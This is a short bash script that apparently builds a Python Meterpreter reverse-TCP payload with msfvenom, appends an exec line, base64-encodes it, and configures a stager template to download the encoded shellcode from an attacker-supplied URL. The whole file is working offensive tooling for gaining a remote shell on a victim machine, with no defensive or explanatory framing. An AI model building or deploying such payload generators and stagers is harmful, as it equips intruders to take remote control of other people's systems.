#!/bin/bash

lhost=""
lport=""
url=""
#hardcoded values
tmp="/tmp/lol"
shellcode="www/shellcode"
stagerin="templates/stager.py"
stagerout="bin/stager.py"
msf="/opt/metasploit-framework/msfvenom"
payload="python/meterpreter/reverse_tcp"


usage() {
    echo "[>] Usage: $0 -l <lhost> -p <lport> -u <url>"
    exit 1
}

while [ -n "$1" ]; do
    case "$1" in
        -l)
            shift; lhost="$1";;
        -p)
            shift; lport="$1";;
        -u)
            shift; url="$1/shellcode";;
        *)
            echo "[!] Invalid switch"
            usage;;
    esac
    shift
done

[ -z "$lhost" -o -z "$lport" ] && usage

#clear workspace
for i in $tmp $shellcode $stagerout ; do
    rm $i &>/dev/null
done

echo "[>] Generating shellcode..."
$msf -p $payload lhost=$lhost lport=$lport -f python -o $shellcode &>/dev/null
echo "[>] Patching..."
echo "exec buf" >> $shellcode
echo "[>] Encoding..."
cat $shellcode | base64 > $tmp && mv $tmp $shellcode && rm $tmp &>/dev/null
echo "[>] Configuring stager..."
sed 's%'"__SERVER__"'%'"$url"'%' < $stagerin > $stagerout
echo "[+] Done!!!"
